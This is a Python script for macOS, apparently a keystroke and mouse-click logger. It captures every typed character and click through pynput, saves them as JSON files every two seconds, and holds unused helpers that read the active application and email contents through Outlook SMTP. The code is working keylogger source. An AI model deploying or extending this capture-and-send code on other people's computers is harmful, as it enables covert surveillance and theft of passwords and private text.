#!/usr/bin/env python3

from AppKit import NSWorkspace
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import json
import os
from pynput import keyboard, mouse
import smtplib
import threading

"""
    MISCELLANEOUS
"""

def timestamp():
    right_now = datetime.now()
    return right_now.strftime('%d-%m-%Y %H%M-%S')

def sort_dict_descending_keys(dictionary):
    return sorted(dictionary.items(), key=lambda pair: pair[1], reverse=True)

"""
    EMAIL SENDING
"""

def construct_mime(email_address, contents):
    message = MIMEMultipart()
    message['From'] = email_address
    message['To'] = email_address
    message['Subject'] = timestamp()
    message.attach(MIMEText(contents, 'plain'))
    
    return message

def send_email(email_address, password, contents):
    server = smtplib.SMTP(host='smtp-mail.outlook.com', port=587)
    server.starttls()
    server.login(email_address, password)

    mime_object = construct_mime(email_address, contents)
    server.send_message(mime_object)

    server.quit()

"""
    APPLICATION TRACKING
"""

def get_focus_app_string():
    workspace = NSWorkspace.sharedWorkspace()
    return workspace.activeApplication()['NSApplicationName']

"""
    MONITORING
"""

class Monitor:
    passphrase = "I'm fishing in the river champion!"

    def __init__(self):
        self.log_interval = 2 
        # state variables
        self.logs = list()
        self.text = str()
        
        # listeners
        self.keys = keyboard.Listener(on_press=self.on_press)
        self.mice = mouse.Listener(on_click=self.on_click)
    
    def create_log(self):
        # for now we log even if there was no log contents
        log_name = f'logs/{timestamp()}.json'
        with open(log_name, 'w') as log_file:
            log_file.write(json.dumps(self.logs, indent=4))
        self.logs = list()

        timer = threading.Timer(interval=self.log_interval, function=self.create_log)
        timer.daemon = True
        timer.start()
    
    def record_raw_input(self, input_dict):
        # only record text if it's not empty
        if self.text:
            self.logs.append({'o' : self.text})
            self.text = str()
        self.logs.append(input_dict)

    def on_press(self, key):
        # handle the None case and all falsey keyboard.Keys
        if not key:
            return

        if (key == keyboard.Key.esc):
            if self.text:
                self.logs.append({'o' : self.text})
            self.mice.stop()
            return False
        
        try:
            self.text += key.char
        # when we hit a special character we update all regular text
        except AttributeError:
            self.record_raw_input({'s' : key.name.upper()})

    # pass in x and y to follow expected parameters of on_click
    def on_click(self, x, y, button, pressed):
        if (pressed):
            self.record_raw_input({'m' : button.name.upper()})

    def run(self):
        # create the logs folder if it does not exist
        try:
            os.mkdir('logs')
        except FileExistsError:
            pass

        self.keys.start()
        self.mice.start()

        self.create_log()

        self.keys.join()
        self.mice.join()
        
def main():
    monitor = Monitor()
    monitor.run()

if __name__ == '__main__':
    main()
